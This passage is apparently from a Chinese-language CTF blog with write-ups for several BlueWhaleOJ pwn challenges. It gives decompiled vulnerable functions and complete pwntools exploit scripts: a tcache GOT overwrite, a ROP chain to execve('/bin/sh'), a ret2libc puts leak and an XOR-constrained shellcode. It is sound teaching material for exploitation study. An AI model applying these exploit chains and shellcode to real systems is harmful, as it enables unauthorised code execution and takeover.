Tcache-&gt;note2-&gt;tmp3-&gt;tmp2-&gt;tmp1-&gt;0.</span></span><br><span class="line">edit_note(note1, pg.get(<span class="number">0x38</span>) + p64(<span class="number">0x41</span>) + p64(note_addr))</span><br><span class="line"><span class="comment"># Tcache-&gt;note2-&gt;note_addr.</span></span><br><span class="line"></span><br><span class="line">note2 = new_note()  <span class="comment"># notes[10], heap[7].</span></span><br><span class="line"><span class="comment"># Tcache-&gt;note_addr.</span></span><br><span class="line"><span class="comment"># Get note_addr and write something to it.</span></span><br><span class="line">new_note(p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))  <span class="comment"># notes[11], note_addr.</span></span><br><span class="line"><span class="comment"># notes[0] = free@got, notes[1] = puts@got, notes[2] = atoi@got.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write puts@plt to free@got.</span></span><br><span class="line"><span class="comment"># edit_note(0, p64(elf.plt[&#x27;puts&#x27;]))  # Not p64!</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="string">&#x27;\x30\x06\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Call free, which actually is puts.</span></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(conn.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Puts address: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write system address to atoi@got.</span></span><br><span class="line">edit_note(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">conn.send(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnalpha-200"><a href="#pwnalpha-200" class="headerlink" title="pwnalpha(200)"></a>pwnalpha(200)</h1><p>这道题是 64 位的静态编译去符号程序，所以反汇编以后会出现很多函数，所以首先就需要找到程序的入口点。先运行一下程序，程序的输出如下</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/6.png"></p><p>在 IDA 中搜索字符串 <code>Hello brave new challenger</code> 就可以查到使用该字符串的函数的位置以及他的调用位置，最后定位到 0x400BC1 的函数中，主要的漏洞位于 0x400B60 函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400B60</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  sub_410390(<span class="string">&quot;Any last words?&quot;</span>);</span><br><span class="line">  sub_4498A0(<span class="number">0</span>, &amp;buf, <span class="number">0x7D0</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sub_40F710((<span class="type">unsigned</span> __int64)<span class="string">&quot;This will be the last thing that you say: %s\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据函数行为，sub_410390 应该是 puts 函数，sub_4498A0 应该是 read 函数，sub_40F710 应该是 print 函数。buf 是 1024 字节，但是接受 2000 字节，很典型的栈溢出，所以需要填充的字节为 1024+8 个字节的垃圾数据，之后就可以控制 rip 了。</p><p>根据 checksec，程序设置了 NX，所以 shellcode 不能写在栈上，但是因为去符号化以后 system 函数不好找，所以思路大概就是通过 rop 执行系统调用，由于是静态变异，所以程序中的 gadget 非常多，也很好找。这里使用 execve 的系统调用，首先需要把第一个参数 <code>/bin/sh</code> 写入 bss 段中，之后利用 pop 就可以控制各种寄存器了。这里使用的 rop 链如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop rdx ; ret</span><br><span class="line">pop rax ; ret</span><br><span class="line">mov qword ptr [rax], rdx ; ret</span><br><span class="line">pop rdi ; ret</span><br><span class="line">pop rsi ; ret</span><br><span class="line">pop rdx ; ret</span><br><span class="line">pop rax ; ret</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>首先把 <code>//bin/sh</code> 字符串放入 rdx 中，把 bss 段要存放字符串的地址放入 rax 中，之后 mov 就可以把字符串写入 bss 段里了，之后就把 bss 的字符串地址放入 rdi 中，execve 的后两个参数为 0，分别放入 rsi 和 rdx 中，最后把 execve 的调用号 0x3b 放入 rax 中，执行系统调用即可。最终的 exp 如下，最后拿到 flag 为<code>ctf&#123;pwngame_justpwnit&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19900</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">    syscall = <span class="number">0x40129c</span></span><br><span class="line">bin_sh_bss = <span class="number">0x6BB2E0</span></span><br><span class="line">bin_sh = <span class="string">&#x27;//bin/sh&#x27;</span></span><br><span class="line">null = <span class="number">0x0</span></span><br><span class="line">execve = <span class="number">0x3b</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00000000004498b5 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000415664 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x000000000048d251 : mov qword ptr [rax], rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000400686 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004101f3 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x00000000004498b5 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000415664 : pop rax ; ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(</span><br><span class="line">    <span class="string">&#x27;Any last words?\n&#x27;</span>,</span><br><span class="line">    pg.get(<span class="number">0x400</span>+<span class="number">8</span>) +</span><br><span class="line">    p64(<span class="number">0x00000000004498b5</span>) + bin_sh +</span><br><span class="line">    p64(<span class="number">0x0000000000415664</span>) + p64(bin_sh_bss) +</span><br><span class="line">    p64(<span class="number">0x000000000048d251</span>) +</span><br><span class="line">    p64(<span class="number">0x0000000000400686</span>) + p64(bin_sh_bss) +</span><br><span class="line">    p64(<span class="number">0x00000000004101f3</span>) + p64(null) +</span><br><span class="line">    p64(<span class="number">0x00000000004498b5</span>) + p64(null) + </span><br><span class="line">    p64(<span class="number">0x0000000000415664</span>) + p64(execve) +</span><br><span class="line">    p64(syscall)</span><br><span class="line">)</span><br><span class="line">    conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnbeta-200"><a href="#pwnbeta-200" class="headerlink" title="pwnbeta(200)"></a>pwnbeta(200)</h1><p>这次虽然也是去掉了一些符号，同样开启了 NX，但是不是静态编译了，而且 IDA 可以识别出 main 函数，直接看有漏洞的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40074C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-590h]</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+190h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What say you now?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x24</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(&amp;buf, <span class="string">&quot;Everything intelligent is so boring.&quot;</span>, <span class="number">0x24</span>uLL) )</span><br><span class="line">    result = sub_400705(&amp;v2);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;What a ho-hum thing to say.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">sub_400705</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What an interesting thing to say.\nTell me more.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0x7DA</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Fascinating.\n&quot;</span>, <span class="number">13uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的 buf 的长度为 400 字节，但是只向 buf 中写入 300 个字节，所以 buf 无法溢出，这里的 buf 只做了判断，读取的字符串必须等于 <code>Everything intelligent is so boring.</code> 才会进入 sub_400705，而 sub_400705 的参数 a1 才是真正的溢出点，函数会向 a1 最多写入 2010 个字节，远多于 1024 个字节，所以可以造成栈溢出。</p><p>程序开启了 NX 保护，所以无法执行栈上的 shellcode，那么就可以调用 libc 的 system 函数 getshell。由于没有提供 libc，所以首先需要泄漏出一个 libc 的地址，和以前一样选择 puts 的地址，payload 为<code>&#39;a&#39;*(0x400+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr)</code>，其中 run_addr 为 sub_40074C 的地址。拿到 puts 的地址以后就可以用最后几个字节通过 libc database 拿到 libc 为<code>libc6_2.27-3ubuntu1.2_amd64.so</code></p><p>在拿到 libc 以后就可以计算出 got 表的地址，计算出 system 的地址，注意这里使用 system 函数还需要进行十六字节对齐，和上一道题一样。最终的 exp 如下，最后拿到 flag 为<code>ctf&#123;easypwnstackoverflow&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19901</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">payload</span>):</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;What say you now?\n&#x27;</span>, <span class="string">&#x27;Everything intelligent is so boring.&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(</span><br><span class="line">        <span class="string">&#x27;What an interesting thing to say.\nTell me more.\n&#x27;</span>, </span><br><span class="line">        payload</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">run_addr = <span class="number">0x40074C</span></span><br><span class="line">ret = <span class="number">0x400576</span></span><br><span class="line">    overflow(pg.get(<span class="number">0x400</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr))</span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Fascinating.\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(conn.recv(<span class="number">6</span>)+ <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Get puts address: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = puts_addr - puts_offset</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_addr = got_addr + system_offset</span><br><span class="line">str_bin_sh = got_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;Get system address: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">overflow(pg.get(<span class="number">0x400</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(ret) + p64(system_addr))</span><br><span class="line">    conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwngamma-200"><a href="#pwngamma-200" class="headerlink" title="pwngamma(200)"></a>pwngamma(200)</h1><p>这道题通过 checksec 可以看到开启了所有防护，而且这道题也没有任何溢出点，这道题主要的目的就是程序接收 30 个字节的 shellcode 并且申请一块可执行的内存以后将 shellcode 复制到该内存中并且执行，题目难点就在于这 30 个字节中，前 15 个字节的迭代异或必须和后 15 个字节相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">buf = read(<span class="number">0</span>, shellcode, <span class="number">30uLL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (buf == <span class="number">30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(shellcode) == <span class="number">30</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strchr</span>(shellcode, <span class="number">0x90</span>) )            <span class="comment">// No nop</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Sleeping on the job, you&#x27;re not ready.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v1 = xor(shellcode, <span class="number">15u</span>);</span><br><span class="line">        <span class="keyword">if</span> (v1 == xor(&amp;shellcode[<span class="number">15</span>], <span class="number">15u</span>) )</span><br><span class="line">          shellcode_it(shellcode, <span class="number">30u</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;This is a special race, come back with better.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not up to regulation.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not ready.&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到对 shellcode 的限制一共有三个，第一个是 shellcode 的长度必须为 30，第二个是 shellcode 中不能有 <code>\x90</code> 也就是 nop 指令存在，最后一个就是 shellcode 前 15 个字节的 xor 结果必须和后 15 个字节相同，之后就会执行 shellcode_it 函数，该函数的作用就是申请一块可执行的内存，拷贝 shellcode 到内存中并且执行，重点就在于如何绕过 xor 函数，看看 xor 函数内部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">xor</span><span class="params">(<span class="type">char</span> *buf, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 result; <span class="comment">// [rsp+17h] [rbp-5h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i )                   <span class="comment">// 15</span></span><br><span class="line">    result ^= buf[i];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xor 函数主要使用了迭代异或，因此我们就可以通过控制 shellcode 后面几个字节的值，利用异或可逆的性质来控制异或的结果。首先找一段小于 29 字节的 shellcode，这里之所以为 29 主要是为了空出最后一个字节作为可控字节，这里以一个 24 字节长度的 shellcode 为例<code>\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</code>。</p><p>之后将 shellcode 分为两段，第一段 15 个字节<code>\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f</code>，并且计算出第一段 shellcode 的 xor 结果为 0xcd。</p><p>第二段 9 个字节 <code>\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</code>，为了满足一共 30 个字节的长度要求，需要在第二段 shellcode 后补充字节到 14，这里以<code>\x5f</code> 填充，也就是<code>pop %rdi</code>，填充字节的内容没有限制，可以随便填充，因为 shellcode 执行到 syscall 以后就可以执行命令了，但是不能填充<code>\x00</code>，现在第二段的 shellcode 就变成了<code>\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x5f\x5f\x5f\x5f\x5f</code>，一共 14 字节，并且计算出其 xor 为 0x9d，之后在 shellcode2 之后填充最后一个字节，该字节的值为<code>0xcd^0x9d</code>，这样就可以满足两段 shellcode 的 xor 相同，之后将两段 shellcode 拼接发送。最终的 exp 如下，拿到 flag 为<code>ctf&#123;can_you_write_shellcode&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19902</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">s, <span class="built_in">len</span>=<span class="number">0xf</span></span>):</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[:<span class="built_in">len</span>]:</span><br><span class="line">        result ^= <span class="built_in">ord</span>(i)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor(shellcode1) = 0xcd</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor(shellcode2) = 0x9d</span></span><br><span class="line">shellcode2 = <span class="string">&#x27;\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(shellcode2) != <span class="number">14</span>:</span><br><span class="line">    shellcode2 += <span class="string">&#x27;\x5f&#x27;</span>  <span class="comment"># pop %rdi</span></span><br><span class="line">shellcode2 += <span class="built_in">chr</span>(xor(shellcode1) ^ xor(shellcode2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> xor(shellcode2) == xor(shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode = shellcode1 + shellcode2</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(shellcode) == <span class="number">30</span></span><br><span class="line"></span><br><span class="line">conn.sendafter(<span class="string">&#x27;Send me your drift\n&#x27;</span>, shellcode)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwndelta-200"><a href="#pwndelta-200" class="headerlink" title="pwndelta(200)"></a>pwndelta(200)</h1><p>这道题开启了 NX，并且去符号化静态编译，通过老办法找到程序的入口 sub_400C46，栈溢出的点位于函数 sub_400BD2 内部的 sub_400B73。首先程序读入一个数字，该数字必须小于等于 257，这个数字即为 sub_400B73 读取到 buf 的长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">overflow</span><span class="params">(<span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok, what do you have to say for yourself?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, length);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Interesting thought \&quot;%s\&quot;, I&#x27;ll take it into consideration.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 buf 的大小为 256，而可以读取最大的字节数为 257，所以只能溢出一个字节，再看上一层函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400BD2</span><span class="params">()</span></span><br><span 